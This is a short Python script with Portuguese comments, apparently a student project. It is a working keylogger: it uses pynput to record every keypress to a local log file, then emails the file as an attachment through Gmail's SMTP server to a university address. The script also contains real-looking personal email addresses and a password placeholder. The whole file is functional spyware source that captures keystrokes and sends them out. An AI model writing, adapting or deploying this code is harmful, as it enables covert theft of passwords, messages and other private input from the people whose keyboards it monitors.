import ssl

from pynput.keyboard import Key, Listener
import logging
from email.message import EmailMessage
import smtplib
import os


def enviar_email():
    email_remetente = 'andretestes79@gmail.com'
    email_senha = 'inserir senha'
    email_destinatario = 'andre.e@academico.ufpb.br'

    titulo = 'Registro das Teclas Capturadas'
    corpo = """
    Segue em anexo o arquivo de registro das teclas pressionadas.
    """

    # criando a mensagem e-mail
    em = EmailMessage()
    em['from'] = email_remetente
    em['to'] = email_destinatario
    em['subject'] = titulo
    em.set_content(corpo)

    # Anexando o arquivo de log
    log_file = "Registro_das_teclas.txt"
    if os.path.exists(log_file):
        with open(log_file, 'rb') as f:
            file_data = f.read()
            file_name = os.path.basename(log_file)
        em.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
    else:
        print(f"Arquivo {log_file} não encontrado!")

    # contexto ssl para aumentar a segurança do e-mail
    context = ssl.create_default_context()

    # enviando o e-mail
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_remetente, email_senha)
        smtp.send_message(em)
        print(f"E-mail enviado para {email_destinatario}")


def ao_pressionar(tecla):
    logging.info(str(tecla))
    # Retornar False ao apertar a tecla ESC, para parar o listener
    if tecla == Key.esc:
        print("Tecla ESC pressionada, encerrando o listener...")
        return False


def criar_log():
    # criar arquivo log
    log_dir = ""

    logging.basicConfig(filename=(log_dir + "Registro_das_teclas.txt"),
                        level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')


if __name__ == '__main__':
    criar_log()

    with Listener(on_press = ao_pressionar) as listener:
        listener.join()

    enviar_email()
